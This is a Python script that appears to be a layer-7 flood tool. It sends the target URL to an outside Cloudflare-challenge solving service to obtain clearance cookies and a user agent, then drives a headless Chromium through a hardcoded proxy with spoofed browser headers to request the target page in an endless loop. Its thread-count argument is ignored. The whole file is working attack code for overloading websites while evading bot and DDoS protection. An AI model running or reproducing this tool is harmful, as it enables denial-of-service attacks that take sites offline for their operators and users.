import sys
import threading
from urllib.parse import urlparse
import httpx
from playwright.sync_api import sync_playwright

def get_cookies_and_useragent(base_url):
    url = "https://cloudflare.oeo.asia/v1" 
    headers = {"Content-Type": "application/json"}
    data = {
        "cmd": "request.get",
        "url": base_url,
        "maxTimeout": 600000
    }
    try:
        response = httpx.post(url, headers=headers, json=data)
        result = response.json()
        useragent = result.get("solution").get("userAgent")
        cookies_list = result.get("solution").get("cookies")
        parsed_url = urlparse(base_url)
        cookies = [
            {
                'name': cookie['name'],
                'value': cookie['value'],
                'domain': parsed_url.hostname,
                'path': cookie.get('path', '/')
            }
            for cookie in cookies_list
        ]
        return cookies, useragent
    except httpx.RequestError as e:
        print(f"Error fetching cookies and user agent: {e}")
        return [], ""

def send_request(target_url, cookies, useragent, proxy):
    with sync_playwright() as p:
        browser = p.chromium.launch(proxy={"server": proxy})
        context = browser.new_context(
            user_agent=useragent,
            extra_http_headers={
                "Referer": "https://www.google.com", 
                "Accept-Encoding": "gzip, deflate, br",
                "Accept-Language": "en-US,en;q=0.9",
                "Cache-Control": "max-age=0",
                "Connection": "keep-alive",
                "Sec-Fetch-Dest": "document",
                "Sec-Fetch-Mode": "navigate",
                "Sec-Fetch-Site": "none",
                "Sec-Fetch-User": "?1",
                "Sec-Gpc": "1",
                "Pragma": "no-cache",
                "Upgrade-Insecure-Requests": "1"
            }
        )
        # Set cookies manually
        for cookie in cookies:
            context.add_cookies([cookie])
        
        page = context.new_page()
        while True:
            try:
                response = page.goto(target_url)
                if response:
                    print(f"Request to {target_url} completed with status code {response.status}")
                else:
                    print(f"Request to {target_url} failed: No response")
            except Exception as e:
                print(f"Request to {target_url} failed: {e}")
        browser.close()

def main(target_url, num_threads):
    proxy = "http://45.90.96.20:5858"
    cookies, useragent = get_cookies_and_useragent(target_url)
    
    # Playwright is not thread-safe, so we need to run it in a single thread
    send_request(target_url, cookies, useragent, proxy)

if __name__ == "__main__":
    if len(sys.argv) != 3:
        print("Usage: python3 script_name.py <target_url> <num_threads>")
        sys.exit(1)
    target_url = sys.argv[1]
    num_threads = int(sys.argv[2])
    main(target_url, num_threads)